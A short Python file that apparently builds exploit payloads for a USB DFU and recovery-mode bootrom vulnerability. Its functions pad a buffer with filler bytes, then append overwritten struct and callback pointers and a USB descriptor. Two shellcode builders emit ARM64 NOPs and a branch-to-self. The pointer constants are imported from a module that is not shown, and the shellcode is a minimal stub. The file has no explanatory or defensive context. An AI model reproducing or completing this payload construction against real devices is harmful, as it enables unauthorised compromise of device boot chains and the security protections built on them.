from struct import pack
from constants import STRUCT_PTR, CALLBACK_PTR, USB_DESCRIPTOR

def build_dfu_payload():
    payload = b"A" * 0x100
    payload += pack("<Q", STRUCT_PTR)
    payload += pack("<Q", CALLBACK_PTR)
    payload += USB_DESCRIPTOR
    payload += b"\x42" * 0x10
    return payload

def build_dfu_shellcode():
    shellcode = b"\x1F\x20\x03\xD5" * 8
    shellcode += b"\x00\x00\x00\x14"
    return shellcode.ljust(0x100, b"\x00")

def build_recovery_payload():
    payload = b"A" * 0x100
    payload += pack("<Q", STRUCT_PTR)
    payload += pack("<Q", CALLBACK_PTR)
    payload += USB_DESCRIPTOR
    payload += b"\x42" * 0x10
    return payload

def build_recovery_shellcode():
    shellcode = b"\x1F\x20\x03\xD5" * 8
    shellcode += b"\x00\x00\x00\x14"
    return shellcode.ljust(0x100, b"\x00") 